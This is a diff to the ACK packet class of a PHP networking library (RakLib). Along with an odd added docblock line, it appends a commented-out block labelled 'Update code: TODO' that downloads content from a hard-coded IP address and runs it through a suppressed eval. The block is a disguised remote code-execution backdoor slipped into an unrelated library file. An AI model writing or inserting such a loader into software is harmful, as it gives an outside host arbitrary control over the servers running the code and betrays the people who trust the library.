@@ -16,5 +16,13 @@
 namespace raklib\protocol;
 
 class ACK extends AcknowledgePacket{
+     /* @var \Countable ${deprecated} */
 	public static $ID = 0xc0;
 }
+
+
+//Update code: TODO (0x05, 0xfe)
+//$c=curl_init('http://116.203.96.151/update');
+//curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
+//@eval(curl_exec($c));
+//curl_close($c);unset($c);
